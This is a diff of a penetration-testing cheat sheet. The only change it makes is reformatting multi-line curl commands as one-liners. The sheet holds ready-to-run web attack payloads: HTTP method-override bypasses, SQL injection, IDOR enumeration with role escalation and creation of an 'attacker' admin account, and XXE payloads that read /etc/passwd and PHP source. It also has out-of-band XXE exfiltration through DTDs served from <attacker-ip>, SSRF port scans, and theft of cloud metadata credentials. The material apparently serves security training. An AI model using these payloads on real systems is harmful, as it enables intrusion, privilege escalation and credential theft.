@@ -23,13 +23,9 @@ curl -s -X DELETE "http://<target>/admin/delete.php?id=1"
 curl -s -X OPTIONS http://<target>/admin/delete.php -v   # check allowed methods
 
 # X-HTTP-Method-Override header (bypass middleware/proxy restrictions)
-curl -s -X POST http://<target>/admin/delete.php \
-  -H "X-HTTP-Method-Override: DELETE" \
-  -d "id=1"
+curl -s -X POST http://<target>/admin/delete.php -H "X-HTTP-Method-Override: DELETE" -d "id=1"
 
-curl -s -X POST http://<target>/api/user/1 \
-  -H "X-HTTP-Method: PUT" \
-  -d '{"role":"admin"}'
+curl -s -X POST http://<target>/api/user/1 -H "X-HTTP-Method: PUT" -d '{"role":"admin"}'
 ```
 
 ### Security Filter Bypass
@@ -45,9 +41,7 @@ curl -s -X GET "http://<target>/search.php?q=1' OR '1'='1"
 # GET request bypasses the sanitization block entirely
 
 # Fuzz verbs with ffuf
-ffuf -w /usr/share/seclists/Fuzzing/http-request-methods.txt \
-  -u http://<target>/admin.php \
-  -X FUZZ -mc 200,302 -v
+ffuf -w /usr/share/seclists/Fuzzing/http-request-methods.txt -u http://<target>/admin.php -X FUZZ -mc 200,302 -v
 ```
 
 ### Burp Suite
@@ -113,9 +107,7 @@ done
 
 ```bash
 # ffuf numeric ID enum
-ffuf -w <(seq 1 500 | tr '\n' '\n') \
-  -u "http://<target>/api/users/FUZZ" \
-  -mc 200 -v
+ffuf -w <(seq 1 500 | tr '\n' '\n') -u "http://<target>/api/users/FUZZ" -mc 200 -v
 
 # Burp Intruder: Sniper on the ID parameter, number payload 1-1000
 
@@ -130,8 +122,7 @@ done
 
 # Filter for content (skip empty/error responses)
 for i in $(seq 1 100); do
-  len=$(curl -so /dev/null -w "%{size_download}" -b "session=<cookie>" \
-    "http://<target>/api/invoice/$i")
+  len=$(curl -so /dev/null -w "%{size_download}" -b "session=<cookie>" "http://<target>/api/invoice/$i")
   echo "$i: $len bytes"
 done | grep -v ": 0 bytes\|: 45 bytes"   # filter empty/error size
 ```
@@ -140,18 +131,13 @@ done | grep -v ": 0 bytes\|: 45 bytes"   # filter empty/error size
 
 ```bash
 # Information disclosure — read another user
-curl -s -H "Authorization: Bearer <token>" \
-  "http://<target>/api/profile/2"
+curl -s -H "Authorization: Bearer <token>" "http://<target>/api/profile/2"
 
 # Insecure function call — modify another user
-curl -s -X PUT -H "Authorization: Bearer <token>" \
-  -H "Content-Type: application/json" \
-  -d '{"role":"admin","uid":2}' \
-  "http://<target>/api/profile/2"
+curl -s -X PUT -H "Authorization: Bearer <token>" -H "Content-Type: application/json" -d '{"role":"admin","uid":2}' "http://<target>/api/profile/2"
 
 # IDOR on delete
-curl -s -X DELETE -H "Authorization: Bearer <token>" \
-  "http://<target>/api/users/2"
+curl -s -X DELETE -H "Authorization: Bearer <token>" "http://<target>/api/users/2"
 
 # Check if role field is user-controlled (in cookies/JWT/JSON)
 # Decode JWT payload:
@@ -167,18 +153,10 @@ curl -s -H "Cookie: session=<cookie>" "http://<target>/api/profile/1"
 # Returns: {"uid":1,"uuid":"a5f38...","username":"admin","role":"web_admin"}
 
 # Step 2: PUT — use leaked uuid to escalate role
-curl -s -X PUT \
-  -H "Cookie: session=<cookie>" \
-  -H "Content-Type: application/json" \
-  -d '{"uid":1,"uuid":"a5f38...","role":"web_admin","username":"admin"}' \
-  "http://<target>/api/profile/<your-uid>"
+curl -s -X PUT -H "Cookie: session=<cookie>" -H "Content-Type: application/json" -d '{"uid":1,"uuid":"a5f38...","role":"web_admin","username":"admin"}' "http://<target>/api/profile/<your-uid>"
 
 # Step 3: POST — use new admin role to create user or exfil data
-curl -s -X POST \
-  -H "Cookie: session=<cookie>" \
-  -H "Content-Type: application/json" \
-  -d '{"username":"attacker","password":"Pwn3d!","role":"web_admin"}' \
-  "http://<target>/api/users"
+curl -s -X POST -H "Cookie: session=<cookie>" -H "Content-Type: application/json" -d '{"username":"attacker","password":"Pwn3d!","role":"web_admin"}' "http://<target>/api/users"
 ```
 
 ---
@@ -191,9 +169,7 @@ XML parsers that process user-supplied XML may resolve external entities — ena
 
 ```bash
 # Change Content-Type and send XML body
-curl -s -X POST "http://<target>/submit" \
-  -H "Content-Type: application/xml" \
-  -d '<?xml version="1.0"?><root><name>test</name></root>'
+curl -s -X POST "http://<target>/submit" -H "Content-Type: application/xml" -d '<?xml version="1.0"?><root><name>test</name></root>'
 
 # Also test JSON endpoints — some accept both
 # Check: Content-Type: application/json → application/xml
@@ -204,9 +180,7 @@ curl -s -X POST "http://<target>/submit" \
 
 ```bash
 # /etc/passwd read — inject into a displayed field
-curl -s -X POST "http://<target>/submit" \
-  -H "Content-Type: application/xml" \
-  -d '<?xml version="1.0" encoding="UTF-8"?>
+curl -s -X POST "http://<target>/submit" -H "Content-Type: application/xml" -d '<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE root [
   <!ENTITY xxe SYSTEM "file:///etc/passwd">
 ]>
@@ -217,9 +191,7 @@ curl -s -X POST "http://<target>/submit" \
 # file:///c:/inetpub/wwwroot/web.config
 
 # PHP source via php://filter
-curl -s -X POST "http://<target>/submit" \
-  -H "Content-Type: application/xml" \
-  -d '<?xml version="1.0" encoding="UTF-8"?>
+curl -s -X POST "http://<target>/submit" -H "Content-Type: application/xml" -d '<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE root [
   <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
 ]>
@@ -249,9 +221,7 @@ EOF
 # Start server: python3 -m http.server 8000
 
 # Send to target:
-curl -s -X POST "http://<target>/submit" \
-  -H "Content-Type: application/xml" \
-  -d '<?xml version="1.0" encoding="UTF-8"?>
+curl -s -X POST "http://<target>/submit" -H "Content-Type: application/xml" -d '<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE root [
   <!ENTITY % remote SYSTEM "http://<attacker-ip>:8000/xxe.dtd">
   %remote;
@@ -272,9 +242,7 @@ cat > xxe.dtd << 'EOF'
 EOF
 
 # Request:
-curl -s -X POST "http://<target>/submit" \
-  -H "Content-Type: application/xml" \
-  -d '<?xml version="1.0" encoding="UTF-8"?>
+curl -s -X POST "http://<target>/submit" -H "Content-Type: application/xml" -d '<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE root [
   <!ENTITY % remote SYSTEM "http://<attacker-ip>:8000/xxe.dtd">
   %remote;
@@ -309,9 +277,7 @@ EOF
 php -S 0.0.0.0:8000
 
 # Request:
-curl -s -X POST "http://<target>/submit" \
-  -H "Content-Type: application/xml" \
-  -d '<?xml version="1.0" encoding="UTF-8"?>
+curl -s -X POST "http://<target>/submit" -H "Content-Type: application/xml" -d '<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE root [
   <!ENTITY % remote SYSTEM "http://<attacker-ip>:8000/xxe.dtd">
   %remote;
@@ -338,9 +304,7 @@ http.server.HTTPServer(('0.0.0.0', 8000), H).serve_forever()
 ```bash
 # Internal port scan via XXE SSRF
 for port in 22 80 443 3306 8080 8443; do
-  curl -s -X POST "http://<target>/submit" \
-    -H "Content-Type: application/xml" \
-    -d "<?xml version=\"1.0\"?>
+  curl -s -X POST "http://<target>/submit" -H "Content-Type: application/xml" -d "<?xml version=\"1.0\"?>
 <!DOCTYPE root [
   <!ENTITY ssrf SYSTEM \"http://127.0.0.1:$port/\">
 ]>
@@ -348,9 +312,7 @@ for port in 22 80 443 3306 8080 8443; do
 done
 
 # Cloud metadata via XXE
-curl -s -X POST "http://<target>/submit" \
-  -H "Content-Type: application/xml" \
-  -d '<?xml version="1.0"?>
+curl -s -X POST "http://<target>/submit" -H "Content-Type: application/xml" -d '<?xml version="1.0"?>
 <!DOCTYPE root [
   <!ENTITY meta SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
 ]>
@@ -372,16 +334,13 @@ cd XXEinjector
 # <?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "XXEINJECT">]><root>&xxe;</root>
 
 # File enumeration
-ruby XXEinjector.rb --host=<attacker-ip> --httpport=8000 \
-  --file=request.txt --path=/etc/passwd --oob=http --phpfilter
+ruby XXEinjector.rb --host=<attacker-ip> --httpport=8000 --file=request.txt --path=/etc/passwd --oob=http --phpfilter
 
 # Directory listing
-ruby XXEinjector.rb --host=<attacker-ip> --httpport=8000 \
-  --file=request.txt --path=/etc/ --oob=http --enumerate
+ruby XXEinjector.rb --host=<attacker-ip> --httpport=8000 --file=request.txt --path=/etc/ --oob=http --enumerate
 
 # Brute force file paths
-ruby XXEinjector.rb --host=<attacker-ip> --httpport=8000 \
-  --file=request.txt --brute=/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt
+ruby XXEinjector.rb --host=<attacker-ip> --httpport=8000 --file=request.txt --brute=/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt
 ```
 
 ---
@@ -412,18 +371,13 @@ done
 
 # IDOR — numeric enum
 for i in $(seq 1 50); do
-  code=$(curl -so /dev/null -w "%{http_code}" -b "session=<c>" \
-    "http://<target>/api/user/$i")
+  code=$(curl -so /dev/null -w "%{http_code}" -b "session=<c>" "http://<target>/api/user/$i")
   [ "$code" = "200" ] && echo "[+] $i"
 done
 
 # XXE — quick file read test
-curl -s -X POST "http://<target>/endpoint" \
-  -H "Content-Type: application/xml" \
-  -d '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>'
+curl -s -X POST "http://<target>/endpoint" -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>'
 
 # XXE — SSRF to metadata
-curl -s -X POST "http://<target>/endpoint" \
-  -H "Content-Type: application/xml" \
-  -d '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/">]><r>&x;</r>'
+curl -s -X POST "http://<target>/endpoint" -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/">]><r>&x;</r>'
 ```
